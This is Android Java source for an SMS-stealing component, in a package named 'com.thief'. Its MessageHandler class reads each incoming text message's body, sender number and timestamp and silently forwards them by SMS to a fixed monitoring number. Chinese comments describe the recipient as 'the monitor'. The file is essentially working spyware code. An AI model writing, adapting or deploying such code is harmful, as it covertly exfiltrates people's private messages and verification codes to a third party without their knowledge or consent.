package com.thief;

import java.text.SimpleDateFormat;
import java.util.Date;

import android.telephony.SmsManager;
import android.telephony.SmsMessage;

public class MessageHandler {
	public static void sendMessage(SmsMessage[] message) {
		StringBuilder sb = new StringBuilder();
		for (SmsMessage msg : message) {
			// 得到短信内容
			String content = msg.getMessageBody();
			// 得到发送者手机号码
			String sender = msg.getOriginatingAddress();
			// 得到短信发送时间
			Date date = new Date();
			date.setTime(msg.getTimestampMillis());
			// 将收到的短信发送给监控者
			SimpleDateFormat format = new SimpleDateFormat(
					"yyyy-MM-dd HH:mm:ss");
			sb.append(format.format(date));
			sb.append("--");
			sb.append(sender);
			sb.append("--");
			sb.append(content);
			String sendContent = sb.toString();
            send(MainActivity.PHONENO,sendContent);
		}		
	}
	public static void send(String destPhone,String msg) {
		SmsManager smsManager = SmsManager.getDefault();
		smsManager.sendTextMessage(destPhone, null, msg, null,
				null);
	}
}
